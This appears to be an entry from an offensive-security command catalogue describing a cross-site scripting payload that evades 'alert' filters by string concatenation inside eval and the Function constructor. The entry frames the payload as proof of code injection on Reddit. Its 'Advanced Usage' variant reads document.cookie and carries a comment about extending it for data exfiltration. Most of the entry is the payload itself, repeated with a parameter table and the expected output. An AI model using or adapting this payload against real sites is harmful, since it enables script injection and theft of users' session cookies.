---
data: eval('ale'+'rt(0)'); Function('ale'+'rt(1)')();
tags:
  - xss
  - javascript
  - injection
type: command
output: Browser alerts displaying '0' and '1'
executor: javascript
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T03:16:37.539Z'
id: 369d9422-12ea-4b24-b405-61a9c0e240a2
verified: false
validated: true
submitted: true
---
# reddit-xss-string-concatenation

## Command

```javascript
eval('ale'+'rt(0)'); Function('ale'+'rt(1)')();
```

## Description

This JavaScript command exploits XSS by concatenating strings to evade filters blocking direct 'alert' calls, executing two alerts via eval and Function constructors to prove arbitrary code injection on Reddit.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| eval('ale'+'rt(0)') | Constructs and evaluates 'alert(0)' via concatenation | Yes |
| Function('ale'+'rt(1)')() | Creates and invokes a function with 'alert(1)' via concatenation | Yes |

## Examples

### Basic Usage

```javascript
eval('ale'+'rt(0)'); Function('ale'+'rt(1)')();
```

### Advanced Usage

```javascript
eval('ale'+'rt(document.cookie)'); // Extend for data exfiltration
```

## Expected Output

Two sequential browser alert popups: first showing '0', second showing '1'. No console errors; confirms successful XSS execution in the target context.

## Related

- [[Related Procedure: Inject Reddit XSS Payload]]
